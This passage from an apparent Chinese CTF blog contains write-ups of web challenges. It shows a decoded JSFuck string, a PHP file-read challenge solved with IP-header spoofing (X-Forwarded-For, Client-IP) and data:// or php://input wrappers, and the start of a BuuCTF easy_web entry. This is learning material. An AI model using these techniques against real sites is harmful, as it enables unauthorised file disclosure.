class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>()<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>)<br>--&gt;<br></code></pre></td></tr></table></figure><p>æŸ¥äº†ä¸‹è¿™ä¸œè¥¿å«<code>jsfuck</code>ç¼–ç ï¼Œå¯ä»¥ç”¨<code>[CTFåœ¨çº¿å·¥å…·-åœ¨çº¿JSfuckåŠ å¯†|åœ¨çº¿JSfuckè§£å¯†|JSfuck|JSfuckåŸç†|JSfuckç®—æ³• (hiencode.com)](http://www.hiencode.com/jsfuck.html)</code>è§£ç (æˆ‘çœ‹å…¶å®ƒå¸ˆå‚…éƒ½æ˜¯ç›´æ¥ä¸¢åˆ°æ§åˆ¶å°é‡Œè¿è¡Œ)ã€‚</p><p>è§£ç åæ˜¯<code>alert(&quot;post me Merak&quot;))</code>ï¼Œ<code>POST</code>éšä¾¿ä¼ ä¸ªå€¼ï¼š<code>Merak=333</code>ï¼ŒåŒæ—¶ä¿®æ”¹<code>X-Forwarded-For: 127.0.0.1</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP">Flag is here~But how to get it? <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <span class="hljs-comment">//ordè¿”å›ASCIIå€¼ï¼Œchrè¿”å›å¯¹åº”çš„ASCIIå­—ç¬¦</span><br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯<code>flag.php</code>,<code>/?file</code>çš„å€¼ç»è¿‡äº†ç®€å•çš„åŠ å¯†è¿‡ç¨‹ï¼Œé€†ç€å›å»å°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$v</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dechange</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>); <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span> * <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$re</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechange</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç»™<code>file</code>èµ‹å€¼<code>ZmpdYSZmXGI=</code>ï¼Œæ³¨æ„è¦æ±‚<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>ï¼Œæ‰¾ä¸ªä¼ªåè®®å†™è¿›å»å°±è¡Œï¼š</p><p><code>?2333=data://text/plain,todat is a happy day</code>æˆ–è€…åˆ©ç”¨POSTæ–¹å¼å’Œ<code>input</code>ç»„åˆ</p><p><code>?2333=php://inputç„¶åæ•°æ®æ˜¯ todat is a happy day</code></p><p>æœ€ååˆ«å¿˜äº†åŠ ä¸ª<code>IP</code>ã€‚</p><p>è¿™ä¸ª<code>payload</code>æç¤º<code>Flag is here~But how to get it?Local access only!&lt;br/&gt;Sorry,you don&#39;t have permission!  Your ip is :sorry,this way is banned! </code>ã€‚ã€‚<code>XFF</code>å¤´ä¸èƒ½ç”¨ï¼Œæ”¹æˆ<code>Client-IP</code>è¯•äº†è¯•ï¼Œæ‹¿åˆ°<code>flag</code>:<code>flag&#123;b5aec9ee-7acb-45a4-b8e3-fbe4ae51f2f4&#125;</code></p><p><img src="/img/taowa4.png" alt="taowa4"></p><p>ç„¶ååˆ©ç”¨<code>input</code>ä¼ªåè®®å»å†™<code>todat is a happy day</code>ä¹Ÿè¡Œï¼Œæˆ‘æ²¡æœ‰å°è¯•ï¼Œè¿™é‡Œç›´æ¥å€Ÿç”¨äº†è¿™ä½å¸ˆå‚…çš„ç»“æœï¼š</p><p>å‚è€ƒ<code>https://www.cnblogs.com/rabbittt/p/13291746.html</code>:</p><p><img src="/img/taowa5.png" alt="taowa5"></p><p>å…¶å®è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘åˆ©ç”¨<code>GET</code>ä¼ å‚ä¹ æƒ¯åœ¨é—®å·å‰é¢åŠ ä¸ª<code>/</code>ï¼Œæ¯”å¦‚è¿™é¢˜ä¸€å¼€å§‹æˆ‘å†™çš„<code>secrettw.php/?balabala</code>ï¼Œä½†å‘ç°è¡Œä¸é€šã€‚ã€‚çœ‹æ¥ä»¥ååšé¢˜è¦æŠŠè¿™ä¸ªä¹ æƒ¯æ”¹æ‰ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_2</title>
    <link href="/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/"/>
    <url>/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œ<code>URL</code>å€¼å¾—æ³¨æ„ï¼š</p><p><code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></p><p><img src="/img/anxunbei1.png" alt="anxunbei1"></p><p>å³é”®æºç è¿˜å¯ä»¥å‘ç°ä¸€è¡Œå­—ï¼š<code>md5 is funny ~</code>(å’Œmd5æœ‰å…³ï¼Ÿ)ï¼Œä¼°è®¡æ˜¯è¢«è—åˆ°å›¾ç‰‡åé¢äº†ã€‚</p><p>å…ˆåœ¨kaliä¸‹ç”¨dirsearchæ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å…¶å®ƒæ–‡ä»¶ï¼š</p><p><code>dirsearch -u http://55a28404-cd69-4529-9626-2cd4d4f499d1.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚çœ‹çœ‹æºç ï¼š</p><p><img src="/img/anxunbei3.png" alt="anxunbei3"></p><p>é€‰ä¸­é‚£æ®µå­—ç¬¦æç¤ºäº†base64ï¼Œåˆ©ç”¨base64è½¬å›¾ç‰‡å·¥å…·è½¬æ¢ç»“æœå°±æ˜¯å·¦ä¸Šè§’é‚£å¼ å›¾ç‰‡ã€‚ä½†å¾ˆæ˜æ˜¾URLä¸­ä¸æ˜¯è¿™ä¸ªä¸œè¥¿ï¼Œåº”è¯¥æ˜¯å°†æ–‡ä»¶åè¿›è¡Œäº†å˜åŒ–ã€‚</p><p>imgå‚æ•°æ˜¯å¤§å°å†™å­—æ¯åŠ æ•°å­—çš„ç»„åˆï¼ŒçŒœæµ‹æ˜¯<code>base64</code>ï¼Œè€Œä¸”éšä¾¿è¾“ä¸ª<code>abc</code>å†çœ‹æºç ä¼šå‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/anxunbei2.png" alt="anxunbei2"></p><p>ç›´æ¥base64è§£ç ï¼š<code>MzUzNTM1MmU3MDZlNjc=</code>ï¼Œåˆæ˜¯ä¸€ä¸²<code>base64</code>å†è§£ç ï¼š<code>3535352e706e67</code>ã€‚çœ‹ç€åƒåå…­è¿›åˆ¶ï¼Œè§£ä¸€ä¸‹ï¼š<code>555.png</code></p><p>ç°åœ¨è¿™ä¸ªå‚æ•°æ€ä¹ˆå‡ºæ¥çš„å°±æ¸…æ¥šäº†ï¼šå­—ç¬¦ä¸²å…ˆç»è¿‡åå…­è¿›åˆ¶ï¼Œå†ç»è¿‡ä¸¤æ¬¡base64åŠ å¯†ã€‚å‰é¢çŒœæµ‹è¿™æ˜¯ä¸ª<code>include</code>çš„å‚æ•°ï¼Œå› 